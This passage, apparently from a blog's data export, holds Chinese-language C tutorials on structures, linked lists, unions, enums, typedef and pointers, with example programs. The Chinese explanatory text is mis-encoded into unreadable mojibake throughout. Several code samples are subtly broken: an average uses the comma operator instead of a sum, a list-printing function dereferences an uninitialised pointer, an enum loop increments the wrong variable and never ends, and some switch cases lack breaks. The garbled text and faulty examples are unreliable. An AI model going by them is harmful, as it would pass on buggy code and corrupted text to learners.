printf(&quot;%6d%8s%6.2f\\n&quot;, stu[i].num, stu[i].name, stu[i].score); printf(&quot;\\n&quot;); return 0; } ç»“æ„ä½“æŒ‡é’ˆæŒ‡å‘ç»“æ„ä½“å˜é‡çš„æŒ‡é’ˆæŒ‡å‘ç»“æ„ä½“å¯¹è±¡çš„æŒ‡é’ˆå˜é‡æ—¢å¯æŒ‡å‘ç»“æ„ä½“å˜é‡,ä¹Ÿå¯æŒ‡å‘ç»“æ„ä½“æ•°ç»„ä¸­çš„å…ƒç´ .æŒ‡é’ˆå˜é‡çš„åŸºç±»å‹å¿…é¡»ä¸ç»“æ„ä½“å˜é‡çš„ç±»å‹ç›¸åŒ.å¦‚: struct Student *pt; //ptå¯ä»¥æŒ‡å‘struct Studentç±»å‹çš„å˜é‡æˆ–æ•°ç»„å…ƒç´ . é€šè¿‡æŒ‡å‘ç»“æ„ä½“å˜é‡çš„æŒ‡é’ˆå˜é‡è¾“å‡ºç»“æ„ä½“å˜é‡ä¸­æˆå‘˜çš„ä¿¡æ¯#include &lt;stdio.h&gt; #include &lt;string.h&gt; int main() { struct Student { long num; char name[20]; char sex; float score; }; struct Student stu_1; struct Student *p; p = &amp;stu_1; stu_1.num = 10101; strcpy(stu_1.name, &quot;Li Lin&quot;); //stu_1.name = &quot;Li Lin&quot;; éæ³•,è¡¨è¾¾å¼å¿…é¡»æ˜¯å¯ä¿®æ”¹çš„å·¦å€¼,stu_1.nameæ˜¯ä¸´æ—¶çš„å€¼ stu_1.sex = &#39;M&#39;; stu_1.score = 89.5; printf(&quot;No.:%ld\\nname:%s\\nsex:%c\\nscore:%5.1f\\n&quot;, stu_1.num, stu_1.name, stu_1.sex, stu_1.score); printf(&quot;No.:%ld\\nname:%s\\nsex:%c\\nscore:%5.1f\\n&quot;, (*p).num, (*p).name, (*p).sex, (*p).score); return 0; } å¦‚æœpæŒ‡å‘ä¸€ä¸ªç»“æ„ä½“å˜é‡stu,ä»¥ä¸‹3ç§ç”¨æ³•ç­‰ä»·. stu.æˆå‘˜å( å¦‚stu.num ) (p).æˆå‘˜å( å¦‚(\\p).num ) p-&gt;æˆå‘˜å( å¦‚p-&gt;num ) æŒ‡å‘ç»“æ„ä½“æ•°ç»„çš„æŒ‡é’ˆ å¯ä»¥ç”¨æŒ‡é’ˆå˜é‡æŒ‡å‘ç»“æ„ä½“æ•°ç»„çš„å…ƒç´  æœ‰3ä¸ªåŒå­¦çš„ä¿¡æ¯,æ”¾åœ¨ç»“æ„ä½“æ•°ç»„ä¸­,è¦æ±‚è¾“å‡ºå…¨éƒ¨åŒå­¦çš„ä¿¡æ¯.#include &lt;stdio.h&gt; #include &lt;string.h&gt; struct Student { long num; char name[20]; char sex; int age; }; struct Student stu[3] = {{10101, \"Zhang\", 'F', 1}, {10103, \"Wang\", 'M', 98}, {10106, \"Li\", 'F', 86}}; int main() { struct Student *p; printf(&quot;No. Name sex age\\n&quot;); for (p = stu; p &lt; stu + 3; p++) //æ‰§è¡Œp++åpçš„å€¼ç­‰äºstu+1,pæŒ‡å‘stu[1]a printf(&quot;%5d %-20s %2c %4d\\n&quot;, p-&gt;num, p-&gt;name, p-&gt;sex, p-&gt;age); return 0; } ç”¨ç»“æ„ä½“å˜é‡å’Œç»“æ„ä½“å˜é‡çš„æŒ‡é’ˆä½œå‡½æ•°å‚æ•°å°†ä¸€ä¸ªç»“æ„ä½“å˜é‡çš„å€¼ä¼ é€’ç»™å¦ä¸€ä¸ªå‡½æ•°ï¼Œæœ‰3ç§æ–¹æ³•ï¼š ç”¨ç»“æ„ä½“å˜é‡çš„æˆå‘˜ä½œå‚æ•°. ç”¨ç»“æ„ä½“å˜é‡ä½œå®å‚ ç”¨æŒ‡å‘ç»“æ„ä½“å˜é‡(æˆ–æ•°ç»„å…ƒç´ )çš„æŒ‡é’ˆä½œå®å‚,å°†ç»“æ„ä½“å˜é‡(æˆ–æ•°ç»„å…ƒç´ )çš„åœ°å€ä¼ ç»™å½¢å‚ æœ‰nä¸ªç»“æ„ä½“å˜é‡,å†…å«å­¦ç”Ÿå­¦å·,å§“åå’Œ3é—¨è¯¾ç¨‹çš„æˆç»©.è¦æ±‚è¾“å‡ºå¹³å‡æˆç»©æœ€é«˜çš„å­¦ç”Ÿçš„æˆç»©(åŒ…æ‹¬å­¦å·,å§“å,3é—¨è¯¾ç¨‹ç»©å’Œå¹³å‡æˆç»©).#include &lt;stdio.h&gt; #define N 3 struct Student { long num; char name[20]; float score[3]; int aver; }; // æœ‰nä¸ªç»“æ„ä½“å˜é‡,å†…å«å­¦ç”Ÿå­¦å·,å§“åå’Œ3é—¨è¯¾ç¨‹çš„æˆç»©.è¦æ±‚è¾“å‡ºå¹³å‡æˆç»©æœ€é«˜çš„å­¦ç”Ÿçš„æˆç»©(åŒ…æ‹¬å­¦å·,å§“å,3é—¨è¯¾ç¨‹æˆç»©å’Œå¹³å‡æˆç»©). int main() { void input(struct Student stu[]); struct Student max(struct Student stu[]); void print(struct Student stud); struct Student stu[N], *p = stu; input(p); print(max(p)); return 0; } void input(struct Student stu[]) { int i; printf(&quot;è¯·è¾“å‡ºå„å­¦ç”Ÿçš„ä¿¡æ¯:å­¦å·,å§“å,3é—¨è¯¾æˆç»©:\\n&quot;); for (i = 0; i &lt; N; i++) { scanf(&quot;%d %s %f %f %f&quot;, &amp;stu[i].num, stu[i].name, &amp;stu[i].score[0], &amp;stu[i].score[1], &amp;stu[i].score[2]); stu[i].aver = (stu[i].score[0], stu[i].score[1], stu[i].score[2]) / 3.0; } } struct Student max(struct Student stu[]) { int i, max = 0; for (i = 0; i &lt; N; i++) { if (stu[i].aver &gt; stu[max].aver) max = i; } return stu[max]; } void print(struct Student stud) { printf(&quot;\\næˆç»©æœ€é«˜çš„å­¦ç”Ÿæ˜¯:\\n&quot;); printf(&quot;å­¦ç”Ÿ:%d\\nå§“å:%s\\nä¸‰é—¨è¯¾æˆç»©:%5.1f,%5.1f,%5.1f\\nå¹³å‡æˆç»©:%6.2f\\n&quot;, stud.num, stud.name, stud.score[0], stud.score[1], stud.score[2]); } ç”¨æŒ‡é’ˆå¤„ç†é“¾è¡¨ é“¾è¡¨ä¸­å„å…ƒç´ åœ¨å†…å­˜ä¸­çš„åœ°å€å¯ä»¥æ˜¯ä¸è¿ç»­çš„ï¼Œè¦æ‰¾åˆ°æŸä¸€å…ƒç´ ï¼Œå¿…é¡»å…ˆæ‰¾åˆ°ä¸Šä¸€ä¸ªå…ƒç´ ï¼Œæ ¹æ®å®ƒæä¾›çš„ä¸‹ä¸€ä¸ªå…ƒç´ åœ°å€æ‰èƒ½æ‰¾åˆ°ä¸€ä¸ªå…ƒç´ . å»ºç«‹ç®€å•çš„é™æ€é“¾è¡¨ç”±3ä¸ªå­¦ç”Ÿæ•°æ®ç»„æˆçš„ç»“ç‚¹ç»„æˆï¼Œè¦æ±‚è¾“å‡ºå„ç»“ç‚¹çš„æ•°æ®.#include &lt;stdio.h&gt; struct Student { long num; float score; struct Student *next; }; int main() { struct Student a, b, c, *head, *p; a.num = 10101; a.score = 89.5; b.num = 10103; b.score = 90; c.num = 10107; c.score = 85; head = &amp;a; a.next = &amp;b; b.next = &amp;c; c.next = NULL; p = head; do { printf(&quot;%ld %5.1f\\n&quot;, p-&gt;num, p-&gt;score); p = p-&gt;next; } while (p != NULL); return 0; } å»ºç«‹åŠ¨æ€é“¾è¡¨å†™ä¸€ä¸ªå‡½æ•°å»ºç«‹ä¸€ä¸ªæœ‰3åå­¦ç”Ÿæ•°æ®çš„å•å‘åŠ¨æ€é“¾è¡¨#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #define LEN sizeof(struct Student) struct Student { long num; float score; struct Student *next; }; int n; struct Student *create(void) //æ­¤å‡½æ•°è¿”å›ä¸€ä¸ªæŒ‡å‘é“¾è¡¨å¤´çš„æŒ‡é’ˆ { struct Student *head; struct Student *p1, *p2; n = 0; //ç»“ç‚¹çš„ä¸ªæ•° p1 = p2 = (struct Student *)malloc(LEN); scanf(&quot;%ld,%f&quot;, &amp;p1-&gt;num, &amp;p1-&gt;score); head = NULL; while (p1-&gt;num != 0) { n = n + 1; if (n == 1) head = p1; else p2-&gt;next = p1;//å°†æ–°ç»“ç‚¹çš„åœ°å€èµ‹ç»™ç¬¬1ä¸ªç»“ç‚¹çš„nextæˆå‘˜ p2 = p1; //ä½¿p2æŒ‡å‘åˆšæ‰å»ºç«‹çš„ç»“ç‚¹ã€‚ p1 = (struct Student *)malloc(LEN);//å¼€è¾Ÿç»“ç‚¹å¹¶ä½¿p1æŒ‡å‘å®ƒ scanf(&quot;%ld,%f&quot;, &amp;p1-&gt;num, &amp;p1-&gt;score); } p2-&gt;next = NULL; return (head); } int main() { struct Student *pt; pt = create(); printf(&quot;\\nnum:%ld\\nsocre:%5.1f\\n&quot;, pt-&gt;num, pt-&gt;score); //è¾“å…¥0,0è¡¨ç¤ºç»“æŸ return 0; } è¾“å‡ºé“¾è¡¨å°†é“¾è¡¨ä¸­å„ç»“ç‚¹çš„æ•°æ®ä¾æ¬¡è¾“å‡ºprintvoid print(struct Student *head) { struct Student *p; printf(&quot;\\nNow,These %d records are:\\n&quot;, n); if (head != NULL) { do { printf(&quot;\\nnum:%ld\\nsocre:%5.1f\\n&quot;, p-&gt;num, p-&gt;score); p = p-&gt;next; } while (p != NULL); } } å…±ç”¨ä½“ç±»å‹å®šä¹‰: union å…±ç”¨ä½“å { æˆå‘˜è¡¨åˆ— }å˜é‡è¡¨åˆ—; å¦‚ union Data { int i; char ch; float f; } a, b, c; ç»“æ„ä½“å’Œå…±ç”¨ä½“çš„åŒºåˆ«: ç»“æ„ä½“å˜é‡æ‰€å ç”¨å†…å­˜é•¿åº¦æ˜¯å„æˆå‘˜å çš„å†…å­˜é•¿åº¦ä¹‹å’Œ.æ¯ä¸ªæˆå‘˜åˆ†åˆ«å æœ‰å…¶è‡ªå·±çš„å†…å­˜å•å…ƒ. å…±ç”¨ä½“å˜é‡æ‰€å çš„å†…å­˜é•¿åº¦ç­‰äºæœ€é•¿çš„æˆå‘˜çš„é•¿åº¦. å¼•ç”¨å…±ç”¨ä½“å˜é‡çš„æ–¹å¼a.ch; a.i; å…±ç”¨ä½“ç±»å‹æ•°æ®çš„ç‰¹ç‚¹ åŒä¸€å†…å­˜æ®µå¯ä»¥ç”¨æ¥å­˜æ”¾å‡ ç§ä¸åŒç±»å‹çš„æˆå‘˜,ä½†åœ¨æ¯ä¸€ç¬é—´æ—¶åªèƒ½å­˜æ”¾å…¶ä¸­ä¸€ä¸ªæˆå‘˜,è€Œä¸æ˜¯åŒæ—¶å­˜æ”¾å‡ ä¸ª.å› ä¸ºåœ¨æ¯ä¸€ç¬æ—¶,å­˜å‚¨å•å…ƒåªèƒ½æœ‰å”¯ä¸€çš„å†…å®¹,ä¹Ÿå°±æ˜¯è¯´,åœ¨å…±ç”¨ä½“å˜é‡ä¸­åªèƒ½å­˜æ”¾ä¸€ä¸ªå€¼. å¯ä»¥å¯¹å…±ç”¨ä½“å˜é‡åˆå§‹åŒ–,ä½†åˆå§‹åŒ–è¡¨ä¸­åªèƒ½æœ‰ä¸€ä¸ªå¸¸é‡. #include &lt;stdio.h&gt; int main() { union Data { int i; char ch; float f; } a = {1, &#39;a&#39;, 1.5}; //éæ³•ï¼Œä¸èƒ½åˆå§‹åŒ–3ä¸ªæˆå‘˜ï¼Œå®ƒä»¬å ç”¨åŒä¸€æ®µå­˜å‚¨å•å…ƒ. union Data a = {16}; union Data a = {.ch=&#39;j&#39;}; } å…±ç”¨ä½“å˜é‡ä¸­èµ·ä½œç”¨çš„æˆå‘˜æ˜¯æœ€åä¸€æ¬¡è¢«èµ‹å€¼çš„æˆå‘˜ï¼Œåœ¨å¯¹å…±ç”¨ä½“å˜é‡ä¸­çš„ä¸€ä¸ªæˆå‘˜èµ‹å€¼ï¼ŒåŸæœ‰å˜é‡å­˜å‚¨å•å…ƒä¸­çš„å€¼å°±å–ä»£ã€‚ å…±ç”¨ä½“å˜é‡çš„åœ°å€å’Œå®ƒçš„å„æˆå‘˜çš„åœ°å€éƒ½æ˜¯åŒä¸€åœ°å€ã€‚ä¾‹å¦‚ï¼š &amp;a.i,&amp;a.c,&amp;a.féƒ½æ˜¯åŒä¸€å€¼. ä¸èƒ½å¯¹å…±ç”¨ä½“å˜é‡èµ‹å€¼,ä¹Ÿä¸èƒ½ä¼å›¾å¼•ç”¨å˜é‡åæ¥å¾—åˆ°ä¸€ä¸ªå€¼. a=1;//éæ³• int m=a;//éæ³• C99å…è®¸åŒç±»å‹çš„å…±ç”¨ä½“å˜é‡äº’ç›¸èµ‹å€¼.å¦‚: b=a;//aå’Œbæ˜¯åŒä¸€ç±»å‹çš„å…±åŒä½“å˜é‡ C99å…è®¸ç”¨å…±åŒä½“å˜é‡ä½œå‡½æ•°å‚æ•°. å…±åŒä½“ç±»å‹å¯ä»¥å‡ºç°åœ¨ç»“æ„ä½“ç±»å‹å®šä¹‰ä¸­,ä¹Ÿå¯ä»¥å®šä¹‰å…±ç”¨ä½“æ•°ç»„. ç»“æ„ä½“ä¹Ÿå¯ä»¥å‡ºç°åœ¨å…±ç”¨ä½“ç±»å‹å®šä¹‰ä¸­,æ•°ç»„ä¹Ÿå¯ä»¥ä½œä¸ºå…±ç”¨ä½“çš„æˆå‘˜ æœ‰è‹¥å¹²ä¸ªäººå‘˜çš„æ•°æ®,å…¶ä¸­æœ‰å­¦ç”Ÿå’Œæ•™å¸ˆ.å­¦ç”Ÿçš„æ•°æ®ä¸­åŒ…æ‹¬:å§“å,å·ç ,æ€§åˆ«,èŒä¸š,ç­çº§.æ•™å¸ˆçš„æ•°æ®åŒ…æ‹¬:å§“å,å·ç ,æ€§åˆ«,èŒä¸š,èŒåŠ¡.è¦æ±‚ç”¨åŒä¸€ä¸ªè¡¨æ ¼æ¥å¤„ç†.#include &lt;stdio.h&gt; struct { int num; char name[10]; char sex; char job; union { int clas; //ç­çº§ char position[10]; //èŒåŠ¡ } category; //å…±ç”¨ä½“å˜é‡ } person[2]; //ç»“æ„ä½“æ•°ç»„ int main() { int i; for (i = 0; i &lt; 2; i++) { printf(&quot;please enter the data of person:\\n&quot;); scanf(&quot;%d %s %c %c&quot;, &amp;person[i].num, &amp;person[i].name, &amp;person[i].sex, &amp;person[i].job); if (person[i].job == &#39;s&#39;) scanf(&quot;%d&quot;, &amp;person[i].category.clas); //å¦‚æ˜¯å­¦ç”Ÿè¾“å…¥ç­çº§ else if (person[i].job == &#39;t&#39;) scanf(&quot;%d&quot;, &amp;person[i].category.position); //å¦‚æ˜¯è€å¸ˆè¾“å…¥èŒåŠ¡ else printf(&quot;Input error!&quot;); } printf(&quot;\\n&quot;); printf(&quot;No. name sex job class/position\\n&quot;); for (i = 0; i &lt; 2; i++) { if (person[i].job == &#39;s&#39;) printf(&quot;%-6d%-10s%-4c%-4c%-10d\\n&quot;, person[i].num, person[i].name, person[i].sex, person[i].job, person[i].category.clas); else printf(&quot;%-6d%-10s%-4c%-4c%-10d\\n&quot;, person[i].num, person[i].name, person[i].sex, person[i].job, person[i].category.position); } return 0; } ä½¿ç”¨æšä¸¾ç±»å‹å¦‚æœä¸€ä¸ªå˜é‡åªæœ‰å‡ ç§å¯èƒ½çš„å€¼,åˆ™å¯ä»¥å®šä¹‰ä¸ºæšä¸¾(enumeration)ç±»å‹,æ‰€è°“â€æšä¸¾â€å°±æ˜¯æŠŠå¯èƒ½çš„å€¼ä¸€ä¸€åˆ—ä¸¾å‡ºæ¥,å˜é‡çš„å€¼åªé™äºåˆ—ä¸¾å‡ºæ¥çš„å€¼çš„èŒƒå›´å†…. å®šä¹‰å¦‚: enum Weekday { sun, mon, tue, wed, thu, fri, sat }; ç”¨æ­¤ç±»å‹æ¥å®šä¹‰å˜é‡ enum Weekday workday, weekend; workday, weekendè¢«å®šä¹‰ä¸ºæšä¸¾å˜é‡ï¼ŒèŠ±æ‹¬å·ä¸­çš„ sun,mon,tue,wed,thu,fri,satç§°ä¸ºæšä¸¾å…ƒç´ æˆ–æšä¸¾å¸¸é‡ã€‚ å£°æ˜æšä¸¾ç±»å‹çš„ä¸€èˆ¬å½¢å¼ä¸ºï¼š enum [æšä¸¾å]{æšä¸¾å…ƒç´ åˆ—è¡¨}; è¯´æ˜ Cç¼–è¯‘å™¨å¯¹æšä¸¾ç±»å‹çš„æšä¸¾å…ƒç´ æŒ‰å¸¸é‡å¤„ç† æ¯ä¸ªæšä¸¾å…ƒç´ éƒ½ä»£è¡¨ä¸€ä¸ªæ•´æ•°,æŒ‰å®šä¹‰æ—¶çš„é¡ºåº,é»˜è®¤ä¸º0,1,2,3â€¦. ä¹Ÿå¯ä»¥äººä¸ºåœ°æŒ‡å®šæšä¸¾å…ƒç´ çš„æ•°å€¼ enum Weekday { sun=7, mon=1, tue, wed, thu, fri, sat }; ä»¥åçš„é¡ºåºåŠ 1,satä¸º6. æšä¸¾å…ƒç´ å¯ä»¥ç”¨æ¥ä½œåˆ¤æ–­æ¯”è¾ƒ. if(workday==mon)... å£è¢‹ä¸­æœ‰çº¢,é»„,è“,ç™½,é»‘5ç§é¢œè‰²çš„çƒè‹¥å¹²ä¸ª.æ¯æ¬¡ä»å£è¢‹ä¸­å…ˆåå–å‡º3ä¸ªçƒ,é—®å¾—åˆ°3ç§ä¸åŒé¢œè‰²çš„çƒçš„å¯èƒ½å–æ³•,è¾“å‡ºæ¯ç§æ’åˆ—çš„æƒ…å†µ.#include &lt;stdio.h&gt; int main() { // å£è¢‹ä¸­æœ‰çº¢,é»„,è“,ç™½,é»‘5ç§é¢œè‰²çš„çƒè‹¥å¹²ä¸ª.æ¯æ¬¡ä»å£è¢‹ä¸­å…ˆåå–å‡º3ä¸ªçƒ,é—®å¾—åˆ°3ç§ä¸åŒé¢œè‰²çš„çƒçš„å¯èƒ½å–æ³•,è¾“å‡ºæ¯ç§æ’åˆ—çš„æƒ…å†µ. enum Color { red, yellow, blue, white, black }; enum Color i, j, k, pri; int n, loop; n = 0; for (i = red; i &lt;= black; i++) //ç¬¬ä¸€ä¸ªçƒ for (j = red; j &lt;= black; j++) //ç¬¬äºŒä¸ªçƒ if (i != j) for (k = red; k &lt;= black; k++) //ç¬¬ä¸‰ä¸ªçƒ { if ((k != j) &amp;&amp; (k != i)) { n++; printf(&quot;%-4d&quot;, n); //è¾“å‡ºå½“å‰æ˜¯ç¬¬å‡ ä¸ªç¬¦åˆæ¡ä»¶çš„ç»„åˆ for (loop = 1; loop &lt;= 3; i++) //å…ˆåå¯¹3ä¸ªçƒåˆ†åˆ«å¤„ç† { switch (loop) { case 1: pri = i; break; case 2: pri = j; case 3: pri = k; default: break; } switch (pri) { case red: printf(&quot;%-10s&quot;, &quot;red&quot;); break; case yellow: printf(&quot;%-10s&quot;, &quot;yellow&quot;); break; case blue: printf(&quot;%-10s&quot;, &quot;blue&quot;); break; case white: printf(&quot;%-10s&quot;, &quot;white&quot;); break; case black: printf(&quot;%-10s&quot;, &quot;black&quot;); break; default: break; } } printf(&quot;\\n&quot;); } } printf(&quot;\\nTotal:%5d\\n&quot;, n); return 0; } ç”¨typedefå£°æ˜æ–°ç±»å‹åç®€å•åœ°ç”¨ä¸€ä¸ªæ–°çš„ç±»å‹åä»£æ›¿åŸæœ‰çš„ç±»å‹åã€‚ typedef int Integer; Integer i, j; //ä½œç”¨ä¸intç›¸åŒ å‘½åä¸€ä¸ªç®€å•çš„ç±»å‹åä»£æ›¿å¤æ‚çš„ç±»å‹è¡¨ç¤ºæ–¹æ³• å‘½åä¸€ä¸ªæ–°çš„ç±»å‹åä»£è¡¨ç»“æ„ä½“ç±»å‹ typedef struct { int month; int day; int year; } Date; Date birthday; Date *p; ä»£è¡¨æ•°ç»„ç±»å‹ typedef int Num[10]; Num a; ä»£è¡¨æŒ‡é’ˆç±»å‹ typedef char *String; String p, s[10];//pä¸ºå­—ç¬¦æŒ‡é’ˆå˜é‡,sä¸ºå­—ç¬¦æŒ‡é’ˆæ•°ç»„ ä»£è¡¨æŒ‡å‘å‡½æ•°çš„æŒ‡é’ˆç±»å‹ typedef int (*Pointer)(); Pointer p1, p2; typedefå’Œ#defineè¡¨é¢ä¸Šæœ‰ç›¸ä¼¼ä¹‹å¤„typedef int Count; å’Œ #define Count int; defineæ˜¯åœ¨é¢„ç¼–è¯‘æ—¶å¤„ç†çš„.å®ƒåªèƒ½åšç®€å•çš„å­—ç¬¦ä¸²æ›¿æ¢è€Œtypedefæ˜¯åœ¨ç¼–è¯‘é˜¶æ®µå¤„ç†çš„,é‡‡ç”¨å¦‚åŒå®šä¹‰å˜é‡çš„æ–¹æ³•é‚£æ ·å…ˆç”Ÿæˆä¸€ä¸ªç±»å‹å,ç„¶åç”¨å®ƒå»å®šä¹‰å˜é‡. å½“ä¸åŒæºæ–‡ä»¶ä¸­ç”¨åˆ°åŒä¸€ç±»å‹æ•°æ®,å¸¸ç”¨typedefå£°æ˜ä¸€äº›æ•°æ®ç±»å‹. ä½¿ç”¨typedefåç§°æœ‰åˆ©äºç¨‹åºçš„é€šç”¨å’Œç§»æ¤.æœ‰çš„è®¡ç®—æœºç³»ç»Ÿintå‹æ•°æ®å ç”¨ä¸ä¸€æ ·,éœ€è¦ä¿®æ”¹: typedef int Integer; ä¿®æ”¹ä¸º: typedef long Integer;","categories":[],"tags":[{"name":"C","slug":"C","permalink":"https://blog.kayleh.top/tags/C/"}]},{"title":"Good use of pointers","slug":"Good-use-of-pointers","date":"2020-10-25T09:18:07.000Z","updated":"2021-04-11T17:11:28.148Z","comments":true,"path":"Good-use-of-pointers/","link":"","permalink":"https://blog.kayleh.top/Good-use-of-pointers/","excerpt":"","text":"å–„äºåˆ©ç”¨æŒ‡é’ˆ Good use of pointers æŒ‡é’ˆå¦‚æœåœ¨ç¨‹åºä¸­å®šä¹‰äº†ä¸€ä¸ªå˜é‡ï¼Œåœ¨å¯¹ç¨‹åºè¿›è¡Œç¼–è¯‘æ—¶ï¼Œç³»ç»Ÿå°±ä¼šç»™è¿™ä¸ªå˜é‡åˆ†é…å†…å­˜å•å…ƒã€‚ç¼–è¯‘ç³»ç»Ÿæ ¹æ®ç¨‹åºä¸­å®šä¹‰çš„å˜é‡ç±»å‹ï¼Œåˆ†é…ä¸€å®šé•¿åº¦çš„ç©ºé—´ã€‚ æ¯ä¸€ä¸ªå­—èŠ‚éƒ½æœ‰ä¸€ä¸ªç¼–å·ï¼Œå°±æ˜¯â€œåœ°å€â€ã€‚ åœ°å€æŒ‡å‘è¯¥å˜é‡å•å…ƒ.åœ°å€å½¢è±¡åŒ–åœ°ç§°ä¸ºâ€æŒ‡é’ˆâ€,å®ƒèƒ½æ‰¾åˆ°ä»¥å®ƒä¸ºåœ°å€çš„å†…å­˜å•å…ƒ. cè¯­è¨€ä¸­çš„åœ°å€åŒ…æ‹¬ä½ç½®ä¿¡æ¯(å†…å­˜ç¼–å·,æˆ–ç§°ä¸ºçº¯åœ°å€)å’Œå®ƒæŒ‡å‘çš„æ•°æ®çš„ç±»å‹ä¿¡æ¯,æˆ–è€…è¯´å®ƒæ˜¯â€å¸¦ç±»å‹çš„åœ°å€â€. åœ¨ç¨‹åºä¸­ä¸€èˆ¬é€šè¿‡å˜é‡åæ¥å¼•ç”¨å˜é‡çš„å€¼, printf(&quot;%d\\n&quot;,i); å¯¹å˜é‡çš„è®¿é—®éƒ½æ˜¯é€šè¿‡åœ°å€è¿›è¡Œçš„. å‡å¦‚æœ‰è¾“å…¥è¯­å¥: scanf(&quot;%d&quot;,&amp;i); åœ¨æ‰§è¡Œæ—¶,æŠŠé”®ç›˜è¾“å…¥çš„å€¼é€åˆ°åœ°å€ä¸º2000å¼€å§‹çš„æ•´å‹å­˜å‚¨å•å…ƒä¸­. å¦‚æœæœ‰è¯­å¥: k=i+j; åˆ™ä»2000~2003å­—èŠ‚å–å‡ºiçš„å€¼(3),å†ä»2004~2007å­—èŠ‚å–å‡ºjçš„å€¼(6),å°†å®ƒä»¬ç›¸åŠ åå†å°†å…¶å’Œ(9)é€åˆ°kæ‰€å ç”¨çš„2008~2011å­—èŠ‚å•å…ƒä¸­.è¿™ç§ç›´æ¥æŒ‰å˜é‡åè¿›è¡Œçš„è®¿é—®ç§°ä¸ºâ€ç›´æ¥è®¿é—®â€ è¿˜å¯ä»¥é‡‡ç”¨å¦ä¸€ç§ç§°ä¸ºâ€œé—´æ¥è®¿é—®â€çš„æ–¹å¼ï¼Œå³å°†å˜é‡içš„åœ°å€å­˜æ”¾åœ¨å¦ä¸€å˜é‡ä¸­ï¼Œç„¶åé€šè¿‡è¯¥å˜é‡æ¥æ‰¾åˆ°å˜é‡içš„åœ°å€ã€‚ä»è€Œè®¿é—®iå˜é‡ã€‚ ä¸ºäº†è¡¨ç¤ºå°†æ•°å€¼3é€åˆ°å˜é‡ä¸­ï¼Œå¯ä»¥æœ‰ä¸¤ç§è¡¨è¾¾æ–¹å¼ï¼š 1) å°†3ç›´æ¥é€åˆ°å˜é‡iæ‰€æ ‡è¯†çš„å•å…ƒä¸­,ä¾‹å¦‚â€i=3;â€ 2) å°†3é€åˆ°å˜é‡i_pointeræ‰€æŒ‡å‘çš„å•å…ƒ(å³å˜é‡içš„å­˜å‚¨å•å…ƒ)ï¼Œä¾‹å¦‚â€œi_pointer=3;â€,å…¶ä¸­*i_pointerè¡¨ç¤ºi_pointeræ‰€æŒ‡å‘çš„å¯¹è±¡ï¼Œ æŒ‡å‘é€šè¿‡i_pointerèƒ½çŸ¥é“içš„åœ°å€ï¼Œä»è€Œæ‰¾åˆ°å˜é‡içš„å†…å­˜å•å…ƒã€‚ i_pointeræŒ‡å‘i æŒ‡é’ˆå˜é‡é€šè¿‡æŒ‡é’ˆå˜é‡è®¿é—®æ•´å‹å˜é‡.#include&lt;stdio.h&gt; int main() { int a = 100, b = 10; //å®šä¹‰æ•´å‹å˜é‡a,b,å¹¶åˆå§‹ int *point_1, *point_2; //å®šä¹‰æŒ‡å‘æ•´å‹æ•°æ®çš„æŒ‡é’ˆå˜é‡point_1,point_2 point_1 = &amp;a; //æŠŠå˜é‡açš„åœ°å€èµ‹ç»™æŒ‡é’ˆå˜é‡point_1 point_2 = &amp;b; printf(&quot;a=%d,b=%d\\n&quot;, a, b); printf(&quot;*point_1=%d,*point_2=%d\\n&quot;, *point_1, *point_2); return 0; } ----- a=100,b=10 *point_1=100,*point_2=10 æ€ä¹ˆå®šä¹‰æŒ‡é’ˆå˜é‡ç±»å‹å * æŒ‡é’ˆå˜é‡å æŒ‡é’ˆå˜é‡æ˜¯åŸºæœ¬æ•°æ®ç±»å‹æ´¾ç”Ÿå‡ºæ¥çš„ç±»å‹,å®ƒä¸èƒ½ç¦»å¼€åŸºæœ¬ç±»å‹è€Œç‹¬ç«‹å­˜åœ¨. æ€æ ·å¼•ç”¨æŒ‡é’ˆå˜é‡1)ç»™æŒ‡é’ˆå˜é‡èµ‹å€¼ p=&amp;a; æŒ‡é’ˆå˜é‡pçš„å€¼æ˜¯å˜é‡açš„åœ°å€,pæŒ‡å‘a. 2)å¼•ç”¨æŒ‡é’ˆå˜é‡æŒ‡å‘çš„å˜é‡. printf(&quot;%d&quot;,*p); ä»¥æ•´æ•°å½¢å¼è¾“å‡ºæŒ‡é’ˆå˜é‡pæ‰€æŒ‡å‘çš„å˜é‡çš„å€¼,å³å˜é‡açš„å€¼. 3)å¼•ç”¨æŒ‡é’ˆå˜é‡çš„å€¼ printf(&quot;%d&quot;,p); ä»¥å…«è¿›åˆ¶æ•°å½¢å¼è¾“å‡ºæŒ‡é’ˆå˜é‡pçš„å€¼ï¼Œå¦‚æœpæŒ‡å‘äº†aï¼Œå°±æ˜¯è¾“å‡ºäº†açš„åœ°å€ï¼Œ&amp;a. è¾“å…¥aå’Œbä¸¤ä¸ªæ•´æ•°ï¼ŒæŒ‰å…ˆå¤§åå°çš„é¡ºåºè¾“å‡ºã€‚#include&lt;stdio.h&gt; int main() { int a, b, *point_a, *point_b, *temp; printf(&quot;please enter two integer number:&quot;); scanf(&quot;%d,%d&quot;, &amp;a, &amp;b); point_a = &amp;a; point_b = &amp;b; if (a &lt; b) { temp = point_b; point_b = point_a; point_a = temp; } printf(&quot;a=%d,b=%d\\n&quot;, a, b); printf(&quot;max=%d,min=%d\\n&quot;, *point_a, *point_b); } æŒ‡é’ˆå˜é‡ä½œä¸ºå‡½æ•°å‚æ•°:heavy_check_mark: è¾“å…¥aå’Œbä¸¤ä¸ªæ•´æ•°ï¼ŒæŒ‰å…ˆå¤§åå°çš„é¡ºåºè¾“å‡ºã€‚#include&lt;stdio.h&gt; int main() { int a, b, *point_a, *point_b; void swap(int *point_a, int *point_b); printf(&quot;please enter two integer number:&quot;); scanf(&quot;%d,%d&quot;, &amp;a, &amp;b); point_a = &amp;a; point_b = &amp;b; if (a &lt; b) swap(point_a, point_b); printf(&quot;max=%d,min=%d\\n&quot;, *point_a, *point_b); } void swap(int *point_a, int *point_b) { int temp; temp = *point_a; *point_a = *point_b; *point_b = temp; } ---------------- //å¦‚æœå†™æˆ: int *temp; *temp = *point_a;//æ­¤è¯­å¥æœ‰é”™è¯¯,ä¸èƒ½å‘ä¸€ä¸ªæœªçŸ¥çš„å­˜å‚¨å•å…ƒèµ‹å€¼. point_a = *point_b; point_b = *temp; ç”±äºâ€å•å‘ä¼ é€’â€œçš„å€¼ä¼ é€’æ–¹å¼ï¼Œå½¢å‚å€¼çš„æ”¹å˜ä¸èƒ½ä½¿å®å‚çš„å€¼éšä¹‹æ”¹å˜. 